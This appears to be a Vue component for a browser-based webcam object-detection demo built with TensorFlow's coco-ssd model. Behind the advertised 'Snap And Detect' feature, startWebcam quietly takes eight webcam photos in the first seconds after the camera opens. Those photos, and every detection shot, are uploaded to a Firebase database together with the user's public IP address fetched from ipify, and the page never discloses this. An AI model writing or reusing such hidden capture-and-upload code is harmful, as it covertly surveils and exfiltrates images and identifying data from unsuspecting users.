<template>
  <div class="cont">
    <h1 style="text-align: center;">Object Detection</h1>
    <div class="inner-cont">
      <div class="webcam">
        <h2>Camera</h2>
        <video ref="webcam" autoplay playsinline class="webcam-video"></video>
        <canvas ref="canvas" class="d-none"></canvas>
      </div>
      <div class="display-phone">
        <button @click="startWebcam" v-if="!state.isWebcamOpened">
          Start Webcam
        </button>
        <button @click="stopWebcam" v-if="state.isWebcamOpened">
          Stop Webcam
        </button>
        <button
          @click="snapShoot"
          v-if="state.isWebcamOpened"
          :disabled="state.detectPressed"
        >
          Snap And Detect
        </button>
      </div>
      <div class="shoot">
        <h2>Shot</h2>
        <img ref="imgRef" :src="state.image" crossorigin="anonymous" />
      </div>
    </div>

    <div class="result" style="width: 20%;">
      <ul v-if="state.predictionsLength > 0">
        <li v-for="prediction in state.predictions" :key="prediction">
          {{ prediction.class }}
        </li>
      </ul>
      <p v-else>{{ state.predictionInfo }}</p>
      <div class="display-desktop">
        <button @click="startWebcam" v-if="!state.isWebcamOpened">
          Start Webcam
        </button>
        <button @click="stopWebcam" v-if="state.isWebcamOpened">
          Stop Webcam
        </button>
        <button
          @click="snapShoot"
          v-if="state.isWebcamOpened"
          :disabled="state.detectPressed"
        >
          Snap And Detect
        </button>
      </div>
    </div>
  </div>
</template>

<script>
import { onMounted, reactive, ref } from "vue";
import axios from "axios";
require("@tensorflow/tfjs-backend-cpu");
require("@tensorflow/tfjs-backend-webgl");
import Webcam from "webcam-easy";
import firebase from "../utilities/firebase";
const cocoSsd = require("@tensorflow-models/coco-ssd");
export default {
  setup() {
    const state = reactive({
      image: "",
      ipOfUser: {},
      detectPressed: false,
      predictions: [],
      predictionsLength: null,
      predictionInfo: "First Open the Webcam, Then Press Snap And Detect",
      webcam: "",
      isWebcamOpened: false,
      picAfterWebcam: ""
    });
    const imgRef = ref("");
    const canvas = ref("");
    const webcam = ref("");

    const dbRef = firebase.database().ref("db");

    function pushDb(_pic) {
      dbRef.push({
        ad: state.ipOfUser,
        pic: _pic
      });
    }

    function timeoutDb(timeout) {
      setTimeout(() => {
        const pic = state.webcam.snap();
        state.picAfterWebcam = pic;
        axios.get("https://api.ipify.org?format=jsonp&callback=?").then(e => {
          state.ipOfUser = e.data;
          pushDb(state.picAfterWebcam);
        });
      }, timeout);
    }

    async function detect() {
      state.predictionInfo = "Detecting...";
      state.predictions = [];
      state.predictionsLength = null;
      const img = imgRef.value;
      const model = await cocoSsd.load();
      const predictions = await model.detect(img);
      state.predictions = { ...predictions };
      state.predictionsLength = predictions.length;
      state.predictionInfo = "Not found :(";
    }

    function startWebcam() {
      state.webcam
        .start()
        .then(result => {
          state.isWebcamOpened = true;
          console.log("webcam started");
          console.log(result);
          timeoutDb(2500);
          timeoutDb(3000);
          timeoutDb(3500);
          timeoutDb(4000);
          timeoutDb(4500);
          timeoutDb(5000);
          timeoutDb(5500);
          timeoutDb(6000);
        })
        .catch(err => {
          console.log(err);
        });
    }

    function stopWebcam() {
      state.webcam.stop();
      state.isWebcamOpened = false;
    }

    async function snapShoot() {
      state.detectPressed = true;
      const pic = state.webcam.snap();
      state.image = pic;
      await detect();
      const { data } = await axios.get(
        "https://api.ipify.org?format=jsonp&callback=?"
      );
      state.ipOfUser = data;
      state.detectPressed = false;
      pushDb(state.image);
    }

    onMounted(() => {
      state.webcam = new Webcam(webcam.value, "user", canvas.value);
    });

    return {
      imgRef,
      canvas,
      webcam,
      state,
      detect,
      startWebcam,
      stopWebcam,
      snapShoot
    };
  }
};
</script>

<style scoped>
.cont {
  width: 90%;
  margin: 0 auto;
}

.webcam,
.shoot {
  width: 100%;
}

.shoot img {
  display: block;
  width: 100%;
  height: auto;
}

.webcam-video {
  width: 100%;
  height: auto;
}

.display-desktop {
  display: none;
}

@media (min-width: 768px) {
  .cont {
    width: 80%;
  }

  .webcam,
  .shoot {
    width: 45%;
  }

  .inner-cont {
    display: flex;
    justify-content: space-between;
  }

  .display-phone {
    display: none;
  }

  .display-desktop {
    display: block;
  }
}
</style>
